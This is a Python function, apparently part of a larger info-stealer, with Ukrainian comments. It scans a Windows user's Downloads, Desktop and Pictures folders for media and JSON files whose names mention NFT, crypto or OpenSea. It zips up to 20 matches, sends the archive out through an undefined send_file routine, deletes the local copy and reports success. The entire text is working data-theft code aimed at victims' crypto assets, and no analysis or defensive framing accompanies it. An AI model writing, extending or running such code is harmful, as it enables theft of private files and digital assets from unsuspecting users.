def steal_nft_files():
    """Пошук файлів, схожих на NFT (зображення, відео, json)"""
    search_folders = [
        os.path.expandvars(r"%USERPROFILE%\Downloads"),
        os.path.expandvars(r"%USERPROFILE%\Desktop"),
        os.path.expandvars(r"%USERPROFILE%\Pictures")
    ]
    extensions = ('.png', '.jpg', '.jpeg', '.gif', '.mp4', '.json')
    nft_files = []
    for folder in search_folders:
        if not os.path.exists(folder):
            continue
        for file in os.listdir(folder):
            if not file.lower().endswith(extensions):
                continue
            # перевіряємо наявність ключових слів
            if 'nft' in file.lower() or 'crypto' in file.lower() or 'opensea' in file.lower():
                nft_files.append(os.path.join(folder, file))
    if nft_files:
        try:
            import zipfile
            zip_name = 'nft_files.zip'
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as z:
                for f in nft_files[:20]:  # обмеження 20 файлів
                    z.write(f, os.path.basename(f))
            send_file(zip_name)
            os.remove(zip_name)
            send_message(f"✅ Знайдено {len(nft_files)} NFT-файлів (надіслано {min(20, len(nft_files))})")
        except Exception:
            send_message("❌ Помилка при створенні архіву NFT")
    else:
        send_message("❌ NFT-файли не знайдено")

